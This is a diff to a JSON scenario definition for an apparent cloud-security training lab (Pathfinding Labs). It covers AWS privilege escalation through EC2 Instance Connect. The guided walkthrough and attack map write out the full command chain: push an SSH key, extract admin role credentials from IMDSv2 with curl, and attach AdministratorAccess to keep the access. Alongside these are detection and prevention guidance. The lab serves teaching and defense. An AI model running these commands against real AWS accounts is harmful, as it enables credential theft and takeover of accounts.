@@ -13,34 +13,8 @@
     "prod"
   ],
   "attackPath": {
-    "principals": [
-      "arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-admin-starting-user",
-      "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx",
-      "arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-admin-ec2-admin-role"
-    ],
-    "summary": "starting_user \u2192 (ec2-instance-connect:SendSSHPublicKey) \u2192 EC2 instance \u2192 (IMDS credential extraction) \u2192 admin access"
-  },
-  "permissions": {
-    "required": [
-      {
-        "permission": "ec2-instance-connect:SendSSHPublicKey",
-        "resource": "arn:aws:ec2:*:{account_id}:instance/{target_instance_id}"
-      }
-    ],
-    "helpful": [
-      {
-        "permission": "ec2:DescribeInstances",
-        "purpose": "Discover EC2 instances with privileged roles"
-      },
-      {
-        "permission": "iam:GetInstanceProfile",
-        "purpose": "View instance profile to determine attached role permissions"
-      },
-      {
-        "permission": "iam:GetRole",
-        "purpose": "View role permissions and policies"
-      }
-    ]
+    "principals": [],
+    "summary": ""
   },
   "mitreAttack": {
     "tactics": [
@@ -57,37 +31,150 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ec2-003-ec2-instance-connect-sendsshpublickey"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ec2-003-ec2-instance-connect-sendsshpublickey",
+  "schemaVersion": "3.0.0",
+  "permissions": {
+    "required": [
+      {
+        "permission": "ec2-instance-connect:SendSSHPublicKey",
+        "resource": "arn:aws:ec2:*:{account_id}:instance/{target_instance_id}",
+        "description": "push a temporary SSH public key to the target EC2 instance"
+      }
+    ],
+    "helpful": [
+      {
+        "permission": "ec2:DescribeInstances",
+        "purpose": "discover EC2 instances with privileged roles attached via instance profiles"
+      },
+      {
+        "permission": "iam:GetInstanceProfile",
+        "purpose": "view instance profile to determine attached role permissions"
+      },
+      {
+        "permission": "iam:GetRole",
+        "purpose": "view role permissions and policies"
+      }
+    ]
+  },
   "readme": {
-    "overview": "This scenario demonstrates a privilege escalation vulnerability where a user has permission to push SSH public keys to an EC2 instance via EC2 Instance Connect. When the target EC2 instance has an attached IAM role with administrative permissions, an attacker can SSH into the instance and extract the role's temporary credentials from the Instance Metadata Service (IMDS), gaining full administrator access to the AWS account.\n\nEC2 Instance Connect is a convenient AWS feature that allows administrators to manage SSH access without maintaining long-lived SSH keys. However, when combined with privileged instance profiles, it creates a privilege escalation path. The `ec2-instance-connect:SendSSHPublicKey` permission allows an attacker to push a temporary SSH public key (valid for 60 seconds) to the instance's metadata, establish an SSH connection, and then query IMDSv2 to retrieve the temporary security credentials of the attached IAM role.\n\nThis attack is particularly dangerous because it provides direct access to high-privilege credentials without triggering typical IAM credential creation alerts (like `CreateAccessKey` or `CreateLoginProfile`). The credentials are already present in the IMDS\u2014the attacker simply needs access to extract them.",
-    "mitreAttack": "- **Tactic**: TA0004 - Privilege Escalation, TA0006 - Credential Access\n- **Technique**: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API\n- **Technique**: T1078.004 - Valid Accounts: Cloud Accounts",
-    "attackDiagram": "graph LR\n    A[pl-prod-ec2-003-to-admin-starting-user] -->|ec2-instance-connect:SendSSHPublicKey| B[EC2 Instance]\n    B -->|SSH Connection| C[Access Instance Shell]\n    C -->|Query IMDSv2| D[Extract Admin Role Credentials]\n    D -->|Use Credentials| E[Effective Administrator]\n\n    style A fill:#ff9999,stroke:#333,stroke-width:2px\n    style B fill:#ffcc99,stroke:#333,stroke-width:2px\n    style C fill:#ffcc99,stroke:#333,stroke-width:2px\n    style D fill:#ffcc99,stroke:#333,stroke-width:2px\n    style E fill:#99ff99,stroke:#333,stroke-width:2px",
-    "attackSteps": "1. **Initial Access**: Start as `pl-prod-ec2-003-to-admin-starting-user` (credentials provided via Terraform outputs)\n2. **Generate SSH Key Pair**: Create a temporary SSH key pair for authentication\n3. **Push Public Key**: Use `ec2-instance-connect:SendSSHPublicKey` to push the public key to the target EC2 instance\n4. **Establish SSH Connection**: Connect to the instance via SSH within the 60-second validity window\n5. **Extract Credentials from IMDS**: Query the Instance Metadata Service (IMDSv2) to retrieve temporary security credentials for the attached admin role\n6. **Switch Context**: Configure AWS CLI with the extracted credentials\n7. **Verification**: Verify administrator access using the extracted credentials",
-    "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::PROD_ACCOUNT:user/pl-prod-ec2-003-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::PROD_ACCOUNT:policy/pl-prod-ec2-003-to-admin-policy` | Allows `ec2-instance-connect:SendSSHPublicKey`, `ec2:DescribeInstances`, and read-only IAM discovery |\n| `arn:aws:iam::PROD_ACCOUNT:role/pl-prod-ec2-003-to-admin-ec2-admin-role` | Admin role attached to the EC2 instance profile |\n| `arn:aws:ec2:REGION:PROD_ACCOUNT:instance/i-xxxxxxxxx` | EC2 instance with the admin role attached via instance profile |\n| `arn:aws:ec2:REGION:PROD_ACCOUNT:security-group/sg-xxxxxxxxx` | Security group allowing SSH access (port 22) |",
-    "attackLab": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-ec2-003-to-admin-starting-user` IAM user to the `pl-prod-ec2-003-to-admin-ec2-admin-role` administrative role by using `ec2-instance-connect:SendSSHPublicKey` to push a temporary SSH public key to an EC2 instance with an attached admin role, SSH into the instance, and extract the role's temporary credentials from the Instance Metadata Service (IMDS).\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-admin-starting-user`\n- **Destination resource:** `arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-admin-ec2-admin-role`",
+    "setup": {
       "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
       "deployNonInteractive": "```bash\nplabs enable enable_single_account_privesc_one_hop_to_admin_ec2_003_ec2_instance_connect_sendsshpublickey\nplabs apply\n```",
-      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to enable it\n4. Press `d` to deploy"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-admin-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:iam::{account_id}:policy/pl-prod-ec2-003-to-admin-policy` | Allows `ec2-instance-connect:SendSSHPublicKey`, `ec2:DescribeInstances`, and read-only IAM discovery |\n| `arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-admin-ec2-admin-role` | Admin role attached to the EC2 instance profile |\n| `arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx` | EC2 instance with the admin role attached via instance profile |\n| `arn:aws:ec2:{region}:{account_id}:security-group/sg-xxxxxxxxx` | Security group allowing SSH access (port 22) |",
       "demoAttack": {
-        "intro": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Generate a temporary SSH key pair\n4. Push the public key to the EC2 instance using `ec2-instance-connect:SendSSHPublicKey`\n5. Establish an SSH connection to the instance\n6. Extract role credentials from IMDSv2\n7. Verify successful privilege escalation to administrator access\n8. Output standardized test results for automation",
-        "resourcesCreated": "- Temporary SSH key pair (public/private key files) created during the demo\n- Extracted credential files containing temporary role credentials\n- AWS CLI profile configurations created for testing",
+        "executing": "The script will:\n1. Display a step-by-step walkthrough with color-coded output\n2. Show the commands being executed and their results\n3. Generate a temporary SSH key pair\n4. Push the public key to the EC2 instance using `ec2-instance-connect:SendSSHPublicKey`\n5. Establish an SSH connection to the instance\n6. Extract role credentials from IMDSv2\n7. Verify successful privilege escalation to administrator access\n8. Output standardized test results for automation",
+        "resourcesCreated": "- Temporary SSH key pair (`/tmp/pathfinding_eic_key` and `/tmp/pathfinding_eic_key.pub`) created during the demo\n- `AdministratorAccess` managed policy attached to `pl-prod-ec2-003-to-admin-starting-user`",
         "nonInteractive": "```bash\nplabs demo --list\nplabs demo ec2-003-ec2-instance-connect-sendsshpublickey\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `r` to run the demo script"
       },
       "cleanup": {
         "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup ec2-003-ec2-instance-connect-sendsshpublickey\n```",
         "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_ec2_003_ec2_instance_connect_sendsshpublickey\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- **Privilege Escalation Path**: EC2 instances with privileged IAM roles accessible via EC2 Instance Connect\n- **Overly Permissive SendSSHPublicKey**: Users/roles with `ec2-instance-connect:SendSSHPublicKey` permission on instances with admin roles\n- **High-Privilege Instance Profiles**: EC2 instances with administrative or highly privileged IAM roles attached\n- **Unrestricted SSH Access**: Security groups allowing SSH (port 22) from wide CIDR ranges (e.g., 0.0.0.0/0)\n- **IMDSv1 Usage**: Instances still using IMDSv1 (which is more vulnerable to credential theft)\n- **Missing Resource Constraints**: IAM policies allowing `SendSSHPublicKey` without resource-based restrictions",
+        "prevention": "1. **Restrict SendSSHPublicKey Permission**: Use resource-based constraints to limit which instances can receive SSH keys:\n   ```json\n   {\n     \"Effect\": \"Allow\",\n     \"Action\": \"ec2-instance-connect:SendSSHPublicKey\",\n     \"Resource\": \"arn:aws:ec2:REGION:ACCOUNT_ID:instance/i-specificinstance\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"ec2:osuser\": \"ec2-user\"\n       }\n     }\n   }\n   ```\n\n2. **Implement Least Privilege for Instance Profiles**: Avoid attaching administrative roles to EC2 instances. Use specific, scoped permissions instead.\n\n3. **Use AWS Systems Manager Session Manager**: Replace SSH access with Session Manager, which provides auditable, credential-free access without requiring open ports:\n   - No need for SSH keys or EC2 Instance Connect\n   - All sessions logged to CloudTrail and S3\n   - Fine-grained access control via IAM policies\n   - No inbound security group rules required\n\n4. **Enforce IMDSv2**: Require IMDSv2 (session-oriented) on all EC2 instances to make credential theft more difficult:\n   ```bash\n   aws ec2 modify-instance-metadata-options \\\n     --instance-id i-1234567890abcdef0 \\\n     --http-tokens required \\\n     --http-put-response-hop-limit 1\n   ```\n\n5. **Restrict SSH Access via Security Groups**: Limit SSH access (port 22) to specific, known IP ranges or VPN endpoints. Never use `0.0.0.0/0` for privileged instances.\n\n6. **Implement SCPs for High-Security Environments**: Use Service Control Policies to prevent `ec2-instance-connect:SendSSHPublicKey` in production accounts:\n   ```json\n   {\n     \"Effect\": \"Deny\",\n     \"Action\": \"ec2-instance-connect:SendSSHPublicKey\",\n     \"Resource\": \"*\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"aws:RequestedRegion\": [\"us-east-1\", \"us-west-2\"]\n       }\n     }\n   }\n   ```\n\n7. **Use IAM Access Analyzer**: Regularly scan for privilege escalation paths involving EC2 instances with overly permissive roles.\n\n8. **Consider VPC Endpoints for IMDS**: In highly sensitive environments, use VPC endpoints and network segmentation to restrict IMDS access patterns.\n\n9. **Separate Development and Production**: Use different AWS accounts for development and production. Restrict EC2 Instance Connect to development accounts only."
       },
-      "teardownNonInteractive": "```bash\nplabs disable enable_single_account_privesc_one_hop_to_admin_ec2_003_ec2_instance_connect_sendsshpublickey\nplabs apply\n```",
-      "teardownTui": "1. Launch the TUI: `plabs`\n2. Navigate to this scenario in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+      "cloudSiem": {
+        "cloudTrailEvents": "- `EC2InstanceConnect: SendSSHPublicKey` -- SSH public key pushed to an EC2 instance via Instance Connect; high severity when the target instance has a privileged role attached\n- `STS: AssumeRole` -- role assumed using temporary credentials retrieved from IMDS; alert when the role ARN matches an instance profile role being used from an unexpected source IP",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
     },
-    "cspm": {
-      "whatToDetect": "- **Privilege Escalation Path**: EC2 instances with privileged IAM roles accessible via EC2 Instance Connect\n- **Overly Permissive SendSSHPublicKey**: Users/roles with `ec2-instance-connect:SendSSHPublicKey` permission on instances with admin roles\n- **High-Privilege Instance Profiles**: EC2 instances with administrative or highly privileged IAM roles attached\n- **Unrestricted SSH Access**: Security groups allowing SSH (port 22) from wide CIDR ranges (e.g., 0.0.0.0/0)\n- **IMDSv1 Usage**: Instances still using IMDSv1 (which is more vulnerable to credential theft)\n- **Missing Resource Constraints**: IAM policies allowing `SendSSHPublicKey` without resource-based restrictions",
-      "prevention": "1. **Restrict SendSSHPublicKey Permission**: Use resource-based constraints to limit which instances can receive SSH keys:\n   ```json\n   {\n     \"Effect\": \"Allow\",\n     \"Action\": \"ec2-instance-connect:SendSSHPublicKey\",\n     \"Resource\": \"arn:aws:ec2:REGION:ACCOUNT_ID:instance/i-specificinstance\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"ec2:osuser\": \"ec2-user\"\n       }\n     }\n   }\n   ```\n\n2. **Implement Least Privilege for Instance Profiles**: Avoid attaching administrative roles to EC2 instances. Use specific, scoped permissions instead.\n\n3. **Use AWS Systems Manager Session Manager**: Replace SSH access with Session Manager, which provides auditable, credential-free access without requiring open ports:\n   - No need for SSH keys or EC2 Instance Connect\n   - All sessions logged to CloudTrail and S3\n   - Fine-grained access control via IAM policies\n   - No inbound security group rules required\n\n4. **Enforce IMDSv2**: Require IMDSv2 (session-oriented) on all EC2 instances to make credential theft more difficult:\n   ```bash\n   aws ec2 modify-instance-metadata-options \\\n     --instance-id i-1234567890abcdef0 \\\n     --http-tokens required \\\n     --http-put-response-hop-limit 1\n   ```\n\n5. **Restrict SSH Access via Security Groups**: Limit SSH access (port 22) to specific, known IP ranges or VPN endpoints. Never use `0.0.0.0/0` for privileged instances.\n\n6. **Implement SCPs for High-Security Environments**: Use Service Control Policies to prevent `ec2-instance-connect:SendSSHPublicKey` in production accounts:\n   ```json\n   {\n     \"Effect\": \"Deny\",\n     \"Action\": \"ec2-instance-connect:SendSSHPublicKey\",\n     \"Resource\": \"*\",\n     \"Condition\": {\n       \"StringEquals\": {\n         \"aws:RequestedRegion\": [\"us-east-1\", \"us-west-2\"]\n       }\n     }\n   }\n   ```\n\n7. **Use IAM Access Analyzer**: Regularly scan for privilege escalation paths involving EC2 instances with overly permissive roles.\n\n8. **Consider VPC Endpoints for IMDS**: In highly sensitive environments, use VPC endpoints and network segmentation to restrict IMDS access patterns.\n\n9. **Separate Development and Production**: Use different AWS accounts for development and production. Restrict EC2 Instance Connect to development accounts only."
-    },
-    "cloudSiem": {
-      "cloudTrailEvents": "- `EC2: SendSSHPublicKey` \u2014 SSH public key pushed to an EC2 instance via Instance Connect; high severity when the target instance has a privileged role attached\n- `STS: AssumeRole` \u2014 Role assumed using temporary credentials retrieved from IMDS; alert when the role ARN matches an instance profile role being used from an unexpected source IP",
-      "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
-    }
+    "guidedWalkthrough": "# Guided Walkthrough: One-Hop Privilege Escalation via ec2-instance-connect:SendSSHPublicKey\n\nThis scenario demonstrates a privilege escalation vulnerability where a user has permission to push SSH public keys to an EC2 instance via EC2 Instance Connect. When the target EC2 instance has an attached IAM role with administrative permissions, an attacker can SSH into the instance and extract the role's temporary credentials from the Instance Metadata Service (IMDS), gaining full administrator access to the AWS account.\n\nEC2 Instance Connect is a convenient AWS feature that allows administrators to manage SSH access without maintaining long-lived SSH keys. However, when combined with privileged instance profiles, it creates a privilege escalation path. The `ec2-instance-connect:SendSSHPublicKey` permission allows an attacker to push a temporary SSH public key (valid for 60 seconds) to the instance's metadata, establish an SSH connection, and then query IMDSv2 to retrieve the temporary security credentials of the attached IAM role.\n\nThis attack is particularly dangerous because it provides direct access to high-privilege credentials without triggering typical IAM credential creation alerts (like `CreateAccessKey` or `CreateLoginProfile`). The credentials are already present in the IMDS \u2014 the attacker simply needs access to extract them.\n\n## The Challenge\n\nYou start as `pl-prod-ec2-003-to-admin-starting-user`, an IAM user whose credentials were provided via Terraform outputs. This user has a narrow set of permissions: `ec2-instance-connect:SendSSHPublicKey` on the target EC2 instance, plus helpful recon permissions (`ec2:DescribeInstances`, `iam:GetInstanceProfile`, `iam:GetRole`).\n\nYour goal is to reach `pl-prod-ec2-003-to-admin-ec2-admin-role`, an IAM role with `AdministratorAccess` that is attached to an EC2 instance via its instance profile. You cannot assume this role directly \u2014 but you can get inside the machine that's already running as it.\n\n## Reconnaissance\n\nFirst, confirm your starting identity:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::<account_id>:user/pl-prod-ec2-003-to-admin-starting-user\n```\n\nTry something that requires elevated permissions to confirm you don't already have it:\n\n```bash\naws iam list-users --max-items 1\n# An error occurred (AccessDenied) ...\n```\n\nGood \u2014 no admin access yet. Now let's look for EC2 instances with privileged roles. Your helpful `ec2:DescribeInstances` permission lets you enumerate running instances:\n\n```bash\naws ec2 describe-instances \\\n  --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn]' \\\n  --output table\n```\n\nYou'll find an instance with an instance profile attached. To check what role that instance profile maps to, use `iam:GetInstanceProfile`:\n\n```bash\naws iam get-instance-profile --instance-profile-name pl-prod-ec2-003-to-admin-instance-profile \\\n  --query 'InstanceProfile.Roles[0].RoleName' --output text\n# pl-prod-ec2-003-to-admin-ec2-admin-role\n```\n\nThen verify the role's permissions with `iam:GetRole` and associated policy calls \u2014 you'll confirm it has `AdministratorAccess`. You've found your target.\n\n## Exploitation\n\n### Step 1: Generate a temporary SSH key pair\n\nEC2 Instance Connect works by pushing a public key to the instance for a 60-second window. You need to generate a key pair first:\n\n```bash\nssh-keygen -t rsa -f /tmp/ec2-connect-key -N '' -q\n```\n\nThis creates `/tmp/ec2-connect-key` (private key) and `/tmp/ec2-connect-key.pub` (public key).\n\n### Step 2: Push the public key via SendSSHPublicKey\n\nNow use `ec2-instance-connect:SendSSHPublicKey` to push your public key to the instance. This is the privilege escalation vector \u2014 your starting user has this permission on the target instance:\n\n```bash\naws ec2-instance-connect send-ssh-public-key \\\n  --region us-east-1 \\\n  --instance-id i-xxxxxxxxx \\\n  --instance-os-user ec2-user \\\n  --ssh-public-key file:///tmp/ec2-connect-key.pub\n```\n\nThe API call succeeds and the key is now loaded in the instance's authorized keys \u2014 but only for 60 seconds. The clock is ticking.\n\n### Step 3: SSH into the instance and extract IMDS credentials\n\nWithin that 60-second window, connect to the instance and query IMDSv2 to retrieve the temporary credentials of the attached admin role. Because the demo script runs this non-interactively, the entire IMDS query is bundled into a single remote command:\n\n```bash\nssh -i /tmp/ec2-connect-key \\\n  -o StrictHostKeyChecking=no \\\n  -o ConnectTimeout=10 \\\n  ec2-user@<instance-public-ip> \\\n  'TOKEN=$(curl -s -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"); ROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'\n```\n\nThe output is a JSON object containing `AccessKeyId`, `SecretAccessKey`, and `Token` for `pl-prod-ec2-003-to-admin-ec2-admin-role`.\n\n### Step 4: Configure credentials and escalate\n\nParse the JSON and export the extracted credentials:\n\n```bash\nexport AWS_ACCESS_KEY_ID=\"<extracted AccessKeyId>\"\nexport AWS_SECRET_ACCESS_KEY=\"<extracted SecretAccessKey>\"\nexport AWS_SESSION_TOKEN=\"<extracted Token>\"\n```\n\nNow use the admin role credentials to attach `AdministratorAccess` to the starting user \u2014 permanently cementing admin access even after the temporary role credentials expire:\n\n```bash\naws iam attach-user-policy \\\n  --user-name pl-prod-ec2-003-to-admin-starting-user \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\n## Verification\n\nSwitch back to the original starting user credentials and wait ~15 seconds for IAM policy propagation:\n\n```bash\nexport AWS_ACCESS_KEY_ID=\"<original starting user key id>\"\nexport AWS_SECRET_ACCESS_KEY=\"<original starting user secret>\"\nunset AWS_SESSION_TOKEN\n\nsleep 15\n\naws iam list-users --max-items 3 --output table\n```\n\nSuccess \u2014 you can now list IAM users, confirming the starting user has been elevated to administrator access.\n\n## What Happened\n\nYou exploited the combination of two misconfigurations: an IAM policy granting `ec2-instance-connect:SendSSHPublicKey` on a specific EC2 instance, and that instance running with an administrative IAM role attached via its instance profile. Neither condition alone is necessarily catastrophic, but together they form a direct privilege escalation path.\n\nThe key insight is that EC2 Instance Connect is designed for convenience, not isolation. The `SendSSHPublicKey` permission is often treated as low-risk because the key only lasts 60 seconds \u2014 but 60 seconds is more than enough time to query IMDS and extract credentials that remain valid for hours. In real environments, this attack pattern appears wherever developers are given SSH access to \"their\" instances without careful review of what roles those instances carry.\n"
   },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-ec2-003-to-admin-starting-user",
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has the ec2-instance-connect:SendSSHPublicKey permission, allowing it to push SSH public keys to the target EC2 instance that has an administrative IAM role attached via its instance profile.\n"
+      },
+      {
+        "id": "ec2-instance",
+        "label": "EC2 Instance",
+        "type": "resource",
+        "subType": "ec2-instance",
+        "arn": "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx",
+        "description": "This EC2 instance has an administrative IAM role attached via its instance profile. By pushing an SSH public key using EC2 Instance Connect and connecting within the 60-second validity window, you can access the instance shell and query IMDSv2 to retrieve the temporary credentials of the attached admin role.\n"
+      },
+      {
+        "id": "target-role",
+        "label": "Admin Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "isTarget": true,
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-ec2-003-to-admin-ec2-admin-role",
+        "description": "This IAM role has AdministratorAccess and is attached to the EC2 instance via its instance profile. By extracting its temporary credentials from IMDSv2, you gain full administrative access to the AWS account.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "ec2-instance",
+        "label": "ec2-instance-connect:SendSSHPublicKey",
+        "description": "Push a temporary SSH public key to the EC2 instance using EC2 Instance Connect. The key is valid for 60 seconds, providing a window to establish an SSH connection.\n",
+        "hints": [
+          "You can push SSH keys to EC2 instances. Are any of them running with elevated permissions?",
+          "Look for EC2 instances with privileged IAM roles attached via instance profiles.",
+          "Browse to https://pathfinding.cloud/paths/ec2-003 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Generate a temporary SSH key pair",
+            "command": "ssh-keygen -t rsa -f /tmp/ec2-connect-key -N '' -q"
+          },
+          {
+            "description": "Push the public key to the EC2 instance",
+            "command": "aws ec2-instance-connect send-ssh-public-key --instance-id i-xxxxxxxxx --instance-os-user ec2-user --ssh-public-key file:///tmp/ec2-connect-key.pub --availability-zone us-east-1a"
+          },
+          {
+            "description": "SSH into the instance within the 60-second window",
+            "command": "ssh -i /tmp/ec2-connect-key ec2-user@<instance-public-ip>"
+          }
+        ]
+      },
+      {
+        "from": "ec2-instance",
+        "to": "target-role",
+        "label": "IMDSv2 credential extraction",
+        "description": "Once on the instance, query the Instance Metadata Service (IMDSv2) to retrieve the temporary security credentials for the attached administrative IAM role.\n",
+        "hints": [
+          "Once on the instance, the Instance Metadata Service (IMDS) is your path to credentials.",
+          "Query IMDSv2 to retrieve temporary security credentials for the attached IAM role."
+        ],
+        "commands": [
+          {
+            "description": "Get an IMDSv2 token",
+            "command": "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')"
+          },
+          {
+            "description": "Retrieve the instance profile role name",
+            "command": "ROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)"
+          },
+          {
+            "description": "Extract the temporary credentials",
+            "command": "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
+          },
+          {
+            "description": "Verify administrator access with the extracted credentials",
+            "command": "aws iam list-users --max-items 1"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
   "slug": "ec2-003"
 }
